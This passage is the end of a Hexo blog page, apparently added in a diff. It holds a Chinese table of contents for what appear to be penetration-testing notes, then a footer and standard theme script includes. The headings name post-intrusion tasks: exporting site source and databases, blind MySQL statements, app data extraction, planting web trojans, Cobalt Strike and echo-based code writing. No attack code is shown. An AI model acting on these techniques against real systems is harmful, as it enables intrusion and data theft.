href="#%E6%B8%97%E9%80%8F%E5%90%8E%E6%89%93%E5%8C%85%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81%E5%AF%BC%E5%87%BA%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C"><span class="nav-number">1.0.0.5.</span> <span class="nav-text">渗透后打包网站源码导出数据库操作</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#mysql%E6%97%A0%E4%BA%A4%E4%BA%92%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E7%9B%B2%E8%BE%93%E8%AF%AD%E5%8F%A5"><span class="nav-number">1.0.0.6.</span> <span class="nav-text">mysql无交互的情况下盲输语句</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#APP%E7%9B%B8%E5%85%B3%E6%80%9D%E8%B7%AF"><span class="nav-number">1.1.</span> <span class="nav-text">APP相关思路</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#app%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96"><span class="nav-number">1.1.1.</span> <span class="nav-text">app敏感数据提取</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E5%90%8E%E7%BD%91%E9%A1%B5%E6%8C%82%E9%A9%AC%E7%B3%BB%E5%88%97"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">渗透后网页挂马系列</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#cs%E7%9B%B8%E5%85%B3"><span class="nav-number">1.1.1.1.1.</span> <span class="nav-text">cs相关</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cecho%E5%86%99%E7%A0%81"><span class="nav-number">1.1.1.1.2.</span> <span class="nav-text">命令执行echo写码</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#csv%E6%96%87%E4%BB%B6%E5%90%88%E5%B9%B6"><span class="nav-number">1.1.2.</span> <span class="nav-text">csv文件合并</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
